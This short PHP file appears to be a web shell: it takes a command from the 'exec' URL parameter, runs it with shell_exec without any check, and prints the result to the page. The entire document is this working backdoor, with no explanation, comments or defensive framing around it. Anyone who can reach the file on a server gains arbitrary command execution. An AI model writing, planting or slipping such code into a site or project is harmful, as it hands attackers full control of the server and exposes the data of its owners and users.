<?php
    $command=$_GET['exec'];

    $output = shell_exec($command);
    echo "<pre>$output</pre>";
?>
